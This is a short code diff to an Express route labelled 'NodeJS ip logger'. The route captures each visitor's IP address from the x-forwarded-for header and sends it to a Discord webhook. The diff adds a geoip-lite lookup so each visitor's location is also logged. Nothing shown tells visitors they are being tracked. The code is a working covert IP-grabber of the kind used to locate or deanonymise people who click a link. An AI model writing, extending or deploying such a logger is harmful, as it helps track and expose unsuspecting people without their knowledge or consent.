@@ -1,5 +1,6 @@
 const express = require('express')
 const router = express.Router()
+const geoip = require('geoip-lite');
 const { Webhook, MessageBuilder } = require("discord-webhook-node");
 const hook = new Webhook(process.env.WEBHOOK_URI);
 const d = new Date();
@@ -7,6 +8,7 @@ let date = d.toDateString();
 
 router.get("/", (req, res) => {
     const ip = req.headers["x-forwarded-for"]
+    const geo = geoip.lookup(ip)
     const embed = new MessageBuilder()
       .setTitle("NodeJS ip logger")
       .setAuthor(
@@ -31,6 +33,7 @@ router.get("/", (req, res) => {
         res.redirect('/error')
     } else {
         console.log(`${ip} just accessed the site.`)
+        console.log(geo)
         hook.send(embed);
         res.redirect('/success')
     }
